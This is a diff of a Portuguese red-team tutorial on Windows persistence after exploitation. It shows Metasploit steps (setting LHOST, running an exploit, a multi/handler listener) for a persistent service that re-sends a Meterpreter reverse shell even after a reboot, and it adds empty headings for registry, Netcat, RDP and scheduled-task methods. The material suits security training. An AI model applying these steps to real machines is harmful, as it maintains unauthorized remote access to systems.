@@ -17,7 +17,8 @@ Técnicas e Táticas
  - SharPersist
 
 ## Técnicas e Táticas
-###Persistence Service
+
+##Persistence Service
 
 Já com o alvo explorado e com uma shell meterpreter:
 - Colocar a sessão em background;
@@ -46,13 +47,29 @@ ip a s
 set LHOST SEUIP
 exploit
 ```
+
 ![persistence-service2](https://user-images.githubusercontent.com/67444297/198635249-b51498b3-7cc6-4cc5-9849-4b143b71e1de.jpg)
 
 **Note que logo que você colocar para ouvir o multi/handler, já receberá uma nova shell, isso se da ao fato de que essa técnica é voltada a um serviço persistente, ou seja, está executando o payload diversas vezes enquanto está vivo.**
 
 Para prova de conceito, iremos dar um reboot na máquina explorada e aguardar a shell em nosso multi/handler.
+
 ![persistence-service3](https://user-images.githubusercontent.com/67444297/198635260-54025d20-366e-4e76-a31e-1731e7da1702.jpg)
 
+
+##Persistence Registry
+
+
+##Netcat
+
+
+##RDP
+
+
+##Schtasks
+
+
+##Schtasks - Log Events
 
 
 ## Ficou com alguma dúvida?
